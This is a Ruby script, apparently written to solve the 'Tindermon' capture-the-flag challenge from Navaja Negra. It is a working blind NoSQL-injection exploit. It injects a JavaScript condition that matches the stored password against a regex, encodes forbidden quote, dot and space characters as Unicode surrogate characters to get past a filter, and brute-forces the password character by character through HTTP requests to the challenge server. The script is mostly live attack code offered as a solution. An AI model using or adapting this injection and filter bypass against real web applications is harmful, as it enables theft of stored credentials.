require 'net/http'
# Script to solve Tindermon challenge from Navaja Negra CTF
# This method is slow as fuck, maybe some threads could help


# The forbidden characters
$waf = ['"',"'","."," "]

# Takes two characters, one of them, a forbidden one and
# find a unicode characters who's 2nd and 4th bytes are
# the same as the hex ascii representation of the two
# characters respectively
def uni(find)
	for i in 0...0xFFFFF
		h = (((i - 0x10000) / 0x400) + 0xD800).to_i.to_s(16)[-2..-1].to_i(16).chr
		l = ((i - 0x10000) % 0x400 + 0xDC00).to_i.to_s(16)[-2..-1].to_i(16).chr

		if(h == find[0] && l == find[1])
			return URI.encode [i.to_i].pack('U')
		end
	end
end

# Takes pairs of characters where a forbidden char is and
# converts it to unicode representation.
def convert_forbidden(string)

	final_string = ""
	len = string.length

	skip = false
	for i in 0..string.length-1 do
			if !skip then
				if $waf.include? string[i] then
					res = uni(string[i] + string[i+1])
					final_string += res
					skip = true
				else
					final_string += URI.encode string[i]
				end
			else
				skip = false
			end
	end

	return final_string.gsub("/","%2F").gsub("[","%5B").gsub("]","%5D").gsub("&","%26")
end

# Just get the resource with the payload and compares if
# the result is true or false based on the redirect
def query(payload)
	uri = URI('http://tindermon.ka0labs.org/avatar/' + payload)
	res = Net::HTTP.get(uri)
	if res.include? "1.jpg"
		return true
	end
	return false
end

base_string = 'pikachu"&&(this.password.match(/^_string_/))=="_string_"||"1"=="0'
total_string = "nn8ed{This.Old.Challenge.With.Unic0de}" # This will store the password (the flag)

while total_string[-1] != "}"
	for i in 32..122
		char = i.chr
		if $waf.include? char
			char = '\\' + char
		end
		dummy_total = total_string + char
		dummy_basetring = base_string.gsub('_string_',dummy_total)
		
		payload = convert_forbidden(dummy_basetring)
		
		if query(payload) then
			total_string += char
			puts "Found! #{total_string}"
		end	
	end
	puts "--"
end

